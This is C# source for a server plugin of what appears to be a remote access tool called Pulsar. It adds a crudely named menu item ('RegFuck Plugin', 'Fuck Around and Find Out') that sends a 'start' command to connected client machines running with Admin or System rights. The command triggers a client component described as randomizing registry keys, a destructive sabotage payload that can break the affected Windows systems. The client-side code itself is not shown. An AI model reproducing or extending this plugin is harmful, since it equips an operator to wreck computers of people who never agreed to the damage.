using Pulsar.Server.Networking;
using Pulsar.Server.Plugins;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Pulsar.Plugin.RanReg.Server
{
    public class Plugin : IServerPlugin
    {
        public string Name => "RanRegServer";
        public Version Version => new Version(1, 0, 0);
        public string Description => "Randomizes Reg Keys on a Client";
        public string Type => "Utility";
        public bool AutoLoadToClients => false;

        private IServerContext _context;

        public void Initialize(IServerContext context)
        {
            _context = context;

            _context.AddClientContextMenuItem(
                "RegFuck Plugin",
                "Fuck Around and Find Out",
                StartRanReg
            );

            _context.Log($"{Name} v{Version} loaded successfully");
        }

        private void StartRanReg(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0)
            {
                _context.Log("No clients selected for RanReg.");
                return;
            }

            foreach (var client in clients)
            {
                bool isClientAdmin = client.Value.AccountType == "Admin" || client.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    SendStartRegRan(client);
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

            }

            _context.Log($"Sent start command to {clients.Count} client(s)");
        }

        private void SendStartRegRan(Client client)
        {
            try
            {
                PushSender.ExecuteUniversalCommand(
                    client,
                    "RanRegClient",
                    "start",
                    null // no parameters
                );

                _context.Log($"Sent start to {client.EndPoint}");
            }
            catch (Exception ex)
            {
                _context.Log($"Error sending start to {client.EndPoint}: {ex.Message}");
            }
        }
    }
}
